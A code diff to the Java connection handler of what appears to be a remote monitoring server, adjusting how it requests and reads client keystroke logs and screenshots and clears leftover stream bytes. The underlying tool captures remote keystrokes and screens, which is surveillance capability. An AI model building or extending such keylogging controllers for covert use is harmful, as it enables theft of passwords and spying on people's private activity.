@@ -70,11 +70,13 @@ class Connection implements Runnable {
 	/**
 	 * Stops the current operation if there is one
 	 */
-	public void killOperation() {
-		if (operation != null && !operation.isInterrupted()) {
+	public boolean killOperation() {
+		if (operation != null) {
 			operation.interrupt();
+			System.out.println("CURRENT THREAD " + getAddress() + " INTERRUPTED");
 			operation = null;
-		}
+			return true;
+		} else return false;
 	}
 
 	/**
@@ -117,8 +119,8 @@ class Connection implements Runnable {
 	public void requestOperation(final String header, final boolean forced) {
 
 		// Kills any currently running operation
-		if (operation != null)
-			killOperation();
+		System.out.println("OPERATION REQUESTION TO " + getAddress() + " - " + header);
+		if (killOperation()) try {Thread.sleep(100);} catch (Exception e) {}
 
 		if (header.equals(PacketHeader.KEYL)) { // Starts a new thread that listens for client keystrokes
 			operation = new Thread(new Runnable() {
@@ -129,6 +131,10 @@ class Connection implements Runnable {
 						output.writeBytes(header + System.getProperty("line.separator"));
 						System.out.println("KEYLOG REQUEST SENT");
 
+						// Clears the remaining input, which is usually old picture data
+						System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
+						connection.getInputStream().skip(connection.getInputStream().available());
+						
 						// Keep listening until thread is interrupted
 						BufferedReader bufferedInput = new BufferedReader(input);
 						while (!Thread.currentThread().isInterrupted()) {
@@ -161,9 +167,15 @@ class Connection implements Runnable {
 				output.writeBytes(header + System.getProperty("line.separator"));
 				System.out.println("PICTURE REQUEST SENT");
 				
+				// Clears the remaining input, which is usually leftover keylog stuff
+				System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
+				connection.getInputStream().skip(connection.getInputStream().available());
+				
 				// Waits until there's actually an image to read
 				while (true) {
 					if (input.ready()) {
+
+						// Read the incoming picture
 						System.out.println("IMAGE DATA RECEIVED - PROCESSING");
 						BufferedImage screenshot = ImageIO.read(connection.getInputStream());
 						System.out.println("IMAGE RECEIVED FROM: " + connection.getInetAddress().getHostAddress());
@@ -171,7 +183,7 @@ class Connection implements Runnable {
 						// Updates the GUI panel
 						RemoteMonitorServer.resetPictureArea(screenshot);
 						
-						// Clears the remaining input. Sometimes there's some random crap leftover
+						// Clears the remaining input again. Sometimes there's some random crap leftover
 						System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
 						connection.getInputStream().skip(connection.getInputStream().available());
 						break;
